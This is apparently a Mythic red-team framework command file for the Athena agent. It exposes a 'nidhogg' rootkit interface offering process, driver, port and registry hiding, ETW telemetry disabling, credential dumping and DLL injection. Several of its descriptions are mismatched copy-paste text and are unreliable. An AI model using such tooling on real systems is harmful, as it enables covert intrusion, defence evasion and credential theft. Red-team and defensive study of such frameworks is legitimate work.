from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *

from .athena_utils import message_converter


class NidhoggArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                cli_name="command",
                display_name="Command",
                type=ParameterType.ChooseOne,
                choices=[
                    "executescript", 
                    "protectfile", 
                    "unprotectfile", 
                    "protectprocess", 
                    "unprotectprocess", 
                    "hideprocess", 
                    "unhideprocess", 
                    "elevateprocess", 
                    "hidethread", 
                    "unhidethread", 
                    "protectthread", 
                    "unprotectthread", 
                    "protectregistrykey",
                    "unprotectregistrykey",
                    "hideregistrykey",
                    "unhideregistrykey",
                    "protectregistryvalue",
                    "unprotectregistryvalue", 
                    "hideregistryvalue", 
                    "unhideregistryvalue", 
                    "enableetwti", 
                    "disableetwti", 
                    "hidedriver", 
                    "unhidedriver", 
                    "hidemodule", 
                    "hideport", 
                    "unhideport", 
                    "dumpcreds", 
                    "injectdll",
                ],
                description="Command to execute",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1
                    )],
            ),
            CommandParameter(
                name="path",
                type=ParameterType.String,
                description="If set, will spoof the parent process ID",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2
                    )],
            ),
            CommandParameter(
                name="id",
                type=ParameterType.Number,
                description="If set, will spoof the parent process ID",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=3
                    )],
            ),
            CommandParameter(
                name="value",
                type=ParameterType.String,
                description="If set, will spoof the parent process ID",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=4
                    )],
            ),
            CommandParameter(
                name="script",
                type=ParameterType.File,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=5
                    )],
            )]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)


class NidhoggCommand(CommandBase):
    cmd = "nidhogg"
    needs_admin = False
    help_cmd = "nidhogg"
    description = "output current environment variables"
    version = 1
    author = "@checkymander"
    attackmapping = []
    argument_class = NidhoggArguments
    attributes = CommandAttributes(
    )
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if "message" in response:
            user_output = response["message"]
            await MythicRPC().execute("create_output", task_id=task.Task.ID, output=message_converter.translateAthenaMessage(user_output))

        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp